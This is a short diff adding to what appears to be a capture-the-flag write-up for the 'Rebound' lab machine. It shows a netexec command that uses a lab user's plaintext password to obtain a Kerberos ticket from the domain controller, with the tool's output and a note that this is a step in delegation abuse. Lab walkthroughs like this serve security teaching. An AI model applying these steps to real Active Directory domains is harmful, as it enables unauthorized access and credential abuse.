@@ -453,4 +453,12 @@ DC01$        Computer                             Unconstrained                 
 delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb  No
 ```
 
+```python
+faketime -f +7h nxc smb dc01.rebound.htb -u 'oorend' -p '1GR8t@$$4u' --generate-tgt oorend -k
+SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.rebound.htb 445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
+SMB         dc01.rebound.htb 445    DC01             [+] TGT saved to: oorend.ccache
+SMB         dc01.rebound.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=oorend.ccache
+```
+This generated a TGT for user without an SPN which is important here
 
